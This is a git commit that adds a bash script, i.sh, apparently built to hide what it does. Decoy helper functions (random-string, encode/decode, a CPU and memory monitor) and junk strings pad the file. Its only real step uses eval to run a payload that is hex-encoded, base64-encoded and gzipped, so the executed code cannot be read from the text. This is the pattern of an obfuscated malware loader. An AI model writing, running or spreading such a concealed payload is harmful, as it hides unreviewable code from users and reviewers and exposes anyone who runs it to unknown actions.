108d4a2901458845187ea21c38c2e6d76179af67
GelixPelixh <111250379+GelixPelixh@users.noreply.github.com>
2024-05-24 22:53:30 +0300

    Create i.sh

---
+++ i.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+jfdkjgkhdj="(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc0a"
+f(){ l=$1;
+c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; r='';
+for((i=0;i<l;i++)); do r+=${c:$((RANDOM%${#c})):1}; done; echo "$r";}
+e(){ s="$1"; r=''; for((i=0;i<${#s};i++)); do c="${s:$i:1}"; ec=$(printf
+'%d' "'$c"); r+="$ec "; done; echo "$r";}
+d(){ es="$1"; ds=''; ecs=($es); for ec in "${ecs[@]}"; do dc=$(printf
+"\x$(printf %x $ec)"); ds+="$dc"; done; echo "$ds";}
+m(){ while true; do cu=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 +
+$4"%"}'); mu=$(free -m | awk 'NR==2{printf "%.2f%%\n", $3*100/$2}'); echo
+"CPU Usage: $cu, Memory Usage: $mu"; sleep 1; done;}
+a6fHFf8j3="4834734943437759546d594141326b7563326741553162555438724d3030
+394b4c4d3767796939497a56505154565149546b784c4c4d726b34674941
+2f69385a716877414141413d0a"
+a6fHFf8j3="4834734943504d7a5547594141326b756332674146597042436f41674641
+58332f785176416e663546584956654a664d44776c526b6c62585477646d
+4d3877346345676e68375873524e2b65446b473948316b514c774a367870
+546746546a4b7933584c62493232585730647a7730597232783779794753
+34517a463678516f2b674657785850735767414141413d3d0a"
+a2fj2o3ijf="38947509183475098731409857039485702983475
+234570237548023974598273450a"
+eval "$(echo $a6fHFf8j3 | xxd -r -p | base64 --decode | gunzip)"
+f(){
+l=$1;c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';r='';for((i=0;i<l;i++));do
+r+=${c:$((RANDOM%${#c})):1};done;echo "$r";}
+e2(){ s="$1";r='';for((i=0;i<${#s};i++));do c="${s:$i:1}";ec=$(printf '%d'
+"'$c");r+="$ec ";done;echo "$r";}
+d1(){ es="$1";ds='';ecs=($es);for ec in "${ecs[@]}";do dc=$(printf
+"\x$(printf %x $ec)");ds+="$dc";done;echo "$ds";}
+m(){ while true;do cu=$(top -bn1|grep "Cpu(s)"|awk '{print $2 +
+$4"%"}');mu=$(free -m|awk 'NR==2{printf "%.2f%%\n", $3*100/$2}');echo "CPU
+Usage: $cu, Memory Usage: $mu";sleep 1;done;}
+#e2 "Encryption and decryption are complex tasks"|d
+ajksdhf="h82f9o24hf2487hfo287hfo8247hfo2874hfh;aksdjf;klasjf
+2fh94hf2794hf274hf2h8p4fhh29p48hfp298hf2984hf
+hhfp24f98h928hf4p98h29hf240a"
